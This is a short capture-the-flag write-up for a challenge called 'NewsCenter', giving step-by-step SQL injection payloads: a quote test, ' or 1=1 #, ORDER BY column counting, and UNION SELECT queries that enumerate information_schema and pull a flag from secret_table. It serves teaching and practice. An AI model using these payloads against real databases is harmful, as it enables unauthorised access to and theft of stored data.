# NewsCenter

![Screenshot from 2021-07-24 22-33-50](https://user-images.githubusercontent.com/87865134/126873468-6659aa6d-5d89-4f46-8c3c-c595dca0f36b.png)

- **Maybe SQLi, XSS**
- **Test SQLi:** 
  - search: `'` => 500 status code
  - search: `' or 1=1 #` => show all post
    - > SQLi

- **How many fields?**
  - `1' order by 4` => 500 status code
  - `1' order by 3` => have result
    - > 3 fields

- **Check type of fields**
  - `' union select 'a', 'b', 'c' #` => have result
    - > varchar

- **Show all tables in this database**
  - `' union select null, table_name, null from information_schema.tables #`
    - > found ***secret_table***
 
 ![Screenshot from 2021-07-24 22-46-43](https://user-images.githubusercontent.com/87865134/126873850-d9469627-9e31-4981-b656-a0f6f5640d9d.png)
 
- **Find name column of** ***secret_table***
  - `' union select null, column_name, null from information_schema.columns where table_name='secret_table' #`
    - > 2 columns: id, fl4g

![Screenshot from 2021-07-24 22-49-51](https://user-images.githubusercontent.com/87865134/126873902-5a910eef-c44a-4e96-b161-dbd14160a287.png)

- **Get content of table** ***secret_table***
  - `a' union select null, fl4g, null from secret_table #`
    - > Got flag

![Screenshot from 2021-07-24 22-51-15](https://user-images.githubusercontent.com/87865134/126873958-5873414c-110e-437f-8a55-04ef544ea53d.png)


- **Desciption:**
  - > category: SQL injection 
 
